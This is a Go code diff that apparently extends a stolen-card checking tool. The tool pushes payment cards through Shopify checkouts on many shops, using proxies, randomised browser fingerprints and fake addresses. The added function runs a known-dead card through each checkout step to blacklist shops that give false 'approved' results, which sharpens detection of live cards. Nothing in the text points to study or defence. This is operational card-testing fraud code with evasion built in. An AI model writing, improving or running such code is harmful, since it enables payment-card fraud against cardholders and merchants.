@@ -241,6 +241,84 @@ func verifySiteIsReal(shopURL, siteLabel, variantID, proxyURL string, addresses 
 	return true // dead card was declined = real gateway
 }
 
+// verifySiteApproval checks whether a site gives fake "approved" (CVV) results.
+// Runs a known-dead card through the checkout. If the dead card ALSO gets
+// classified as "approved" (CVV error), the site is unreliable for approval
+// detection and should be skipped. Returns true if the site is trustworthy.
+func verifySiteApproval(shopURL, siteLabel, variantID, proxyURL string, addresses []Address, proxyPool []string) bool {
+	deadCard, ok := parseCCLine(verifyCardLine)
+	if !ok {
+		fmt.Fprintf(os.Stderr, "[VERIFY-APPR] Failed to parse dead card — assuming site is trustworthy\n")
+		return true
+	}
+
+	fp := randomFingerprint()
+	client := newClient(fp, proxyURL, 12*time.Second)
+
+	cs := &CheckoutSession{
+		Client:    client,
+		ProxyURL:  proxyURL,
+		ShopURL:   shopURL,
+		VariantID: variantID,
+		Card:      deadCard,
+		Addr:      randomAddress(addresses),
+		FP:        fp,
+	}
+
+	fmt.Fprintf(os.Stderr, "[VERIFY-APPR] [%s] Running dead-card approval verification...\n", siteLabel)
+
+	// Step 1: Add to cart
+	if err := cs.Step1AddToCart(); err != nil {
+		fmt.Fprintf(os.Stderr, "[VERIFY-APPR] [%s] Step1 failed: %s — assuming trustworthy\n", siteLabel, err.Error())
+		return true
+	}
+
+	// Step 2: Tokenize dead card
+	if err := cs.Step2TokenizeCard(); err != nil {
+		fmt.Fprintf(os.Stderr, "[VERIFY-APPR] [%s] Step2 failed: %s — assuming trustworthy\n", siteLabel, err.Error())
+		return true
+	}
+
+	// Step 3: Proposal
+	if err := cs.Step3Proposal(); err != nil {
+		fmt.Fprintf(os.Stderr, "[VERIFY-APPR] [%s] Step3 failed: %s — assuming trustworthy\n", siteLabel, err.Error())
+		return true
+	}
+
+	// Step 4: Submit
+	submitResult := cs.Step4Submit()
+	var finalCode string
+
+	if submitResult.ReceiptID == "" {
+		// No receipt — check the direct code
+		finalCode = submitResult.Code
+	} else if !strings.HasPrefix(submitResult.ReceiptID, "gid://shopify/") {
+		// Non-standard receipt, use the code
+		finalCode = submitResult.Code
+	} else {
+		// Standard receipt — poll it
+		_, pollCode, pollResponse := cs.Step5PollReceipt(submitResult.ReceiptID)
+		finalCode = pollCode
+		if pollResponse != nil {
+			finalCode = extractReceiptCode(pollResponse)
+		}
+	}
+
+	if finalCode == "" {
+		finalCode = "UNKNOWN"
+	}
+
+	deadStatus := classifySingleCode(finalCode)
+
+	if deadStatus == "approved" {
+		fmt.Fprintf(os.Stderr, "[VERIFY-APPR] [%s] *** DEAD CARD ALSO APPROVED (%s) — SITE GIVES FAKE APPROVALS ***\n", siteLabel, finalCode)
+		return false // site is UNRELIABLE — gives approvals to dead cards
+	}
+
+	fmt.Fprintf(os.Stderr, "[VERIFY-APPR] [%s] Dead card got '%s' (%s) — site approvals are TRUSTWORTHY\n", siteLabel, deadStatus, finalCode)
+	return true // dead card was properly declined/errored — site is trustworthy
+}
+
 // ─── Core multi-site single-card processor ───────────────────────────────────
 //
 // TWO-PHASE architecture for maximum hit rate with minimal wasted work:
@@ -831,6 +909,19 @@ startPhase2:
 								break // skip this fake site, try next
 							}
 						}
+						// If "approved" at Step4, verify site doesn't give fake approvals
+						if status == "approved" {
+							if !verifySiteApproval(shopURL, siteLabel, product.VariantID, currentProxy, addresses, proxyPool) {
+								fmt.Fprintf(os.Stderr, "[P2] [%s] FAKE APPROVAL detected — dead card also approved at Step4\n", siteLabel)
+								deadMu.Lock()
+								allPermDeadSites = append(allPermDeadSites, shopURL)
+								allTestSites = append(allTestSites, shopURL)
+								deadMu.Unlock()
+								lastFailInfo = fmt.Sprintf("%s:Step4:FAKE_APPROVAL", siteLabel)
+								break // skip this fake site, try next
+							}
+							fmt.Fprintf(os.Stderr, "[P2] [%s] Approval verified REAL — dead card was declined\n", siteLabel)
+						}
 						checkoutCh <- checkoutOutcome{
 							resp: makeResp(status, code), terminal: true,
 						}
@@ -853,6 +944,18 @@ startPhase2:
 								allTestSites = append(allTestSites, shopURL)
 								deadMu.Unlock()
 								lastFailInfo = fmt.Sprintf("%s:Step4:FAKE_GATEWAY", siteLabel)
+								break // skip this fake site, try next
+							}
+						}
+						// If "approved" with non-standard receipt, verify site doesn't give fake approvals
+						if nrStatus == "approved" {
+							if !verifySiteApproval(shopURL, siteLabel, product.VariantID, currentProxy, addresses, proxyPool) {
+								fmt.Fprintf(os.Stderr, "[P2] [%s] FAKE APPROVAL detected via dead-card verify (non-std receipt)\n", siteLabel)
+								deadMu.Lock()
+								allPermDeadSites = append(allPermDeadSites, shopURL)
+								allTestSites = append(allTestSites, shopURL)
+								deadMu.Unlock()
+								lastFailInfo = fmt.Sprintf("%s:Step4:FAKE_APPROVAL", siteLabel)
 								break // skip this fake site, try next
 							}
 						}
@@ -926,6 +1029,19 @@ startPhase2:
 							break // skip this fake site, try next real site
 						}
 						fmt.Fprintf(os.Stderr, "[P2] [%s] Site verified REAL — dead card was declined\n", siteLabel)
+					}
+					// If "approved", verify the site doesn't give fake approvals to dead cards
+					if status == "approved" {
+						if !verifySiteApproval(shopURL, siteLabel, product.VariantID, currentProxy, addresses, proxyPool) {
+							fmt.Fprintf(os.Stderr, "[P2] [%s] *** FAKE APPROVAL *** dead-card also approved — blacklisting site\n", siteLabel)
+							deadMu.Lock()
+							allPermDeadSites = append(allPermDeadSites, shopURL)
+							allTestSites = append(allTestSites, shopURL)
+							deadMu.Unlock()
+							lastFailInfo = fmt.Sprintf("%s:Step5:FAKE_APPROVAL", siteLabel)
+							break // skip this fake site, try next real site
+						}
+						fmt.Fprintf(os.Stderr, "[P2] [%s] Approval verified REAL — dead card was declined\n", siteLabel)
 					}
 					fmt.Fprintf(os.Stderr, "[P2] [%s] Result: %s/%s\n",
 						siteLabel, status, code)
